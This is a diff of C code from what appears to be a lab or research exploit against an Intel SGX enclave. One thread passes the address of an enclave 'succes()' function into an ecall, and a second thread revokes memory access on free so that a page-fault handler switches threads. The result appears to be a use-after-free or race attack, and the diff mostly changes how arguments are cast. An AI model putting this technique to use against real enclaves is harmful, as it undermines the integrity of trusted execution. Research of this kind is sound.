@@ -247,18 +247,18 @@ void* thread_A(void* arg) {
     // Get the address of the succes() function in encl.c, we will use this address as str arg to ecall (exploit)
     void* spt;
     ecall_get_succes_adrs(eidarg, &spt);  // Get address of succes(), written to spt
-    uint64_t address = (uint64_t) spt;
+    //uint64_t address = (uint64_t) spt;
 
     // !!! Dont just do str = spt with some cast, because then page fault (because spt is address in trusted memory?)
-    char str[sizeof(uint64_t)];
+    //char str[sizeof(uint64_t)];
     // Copy address into str 
-    memcpy(str, &address, sizeof(uint64_t));
+    //memcpy(str, &address, sizeof(uint64_t));
 
-    printf("succes() address: %p\n",  spt);
-    printf("input string %p\n", str);
+    printf("succes() address: %p\n", (uint64_t) spt);
+    //printf("input string %p\n", str);
 
     printf("threadA entering enclave\n");
-    ecall_print_and_save_arg_once(eidarg, str); // Enter enclave 
+    ecall_print_and_save_arg_once(eidarg, (uint64_t) &spt); // Enter enclave 
     printf("threadA finished");
 }
 
@@ -286,7 +286,8 @@ void* thread_B(void* arg) {
         printf("access rights revoked on free\n");
     }
     // this ecall will page fault when test_dummy is reached, free() is done, so then pf handler will change thread to thread A
-    ecall_print_and_save_arg_once(eidarg, str);
+    
+    ecall_print_and_save_arg_once(eidarg, (uint64_t) str);
 
 }
 
@@ -304,8 +305,10 @@ int main( int argc, char **argv )
 
     // Dry Run 
     ecall_setup(eid);
+
+
     char* str = "dryrun";
-    ecall_print_and_save_arg_once(eid, str);
+    ecall_print_and_save_arg_once(eid, (uint64_t) str);
 
     // Do setup again
     ecall_setup(eid);
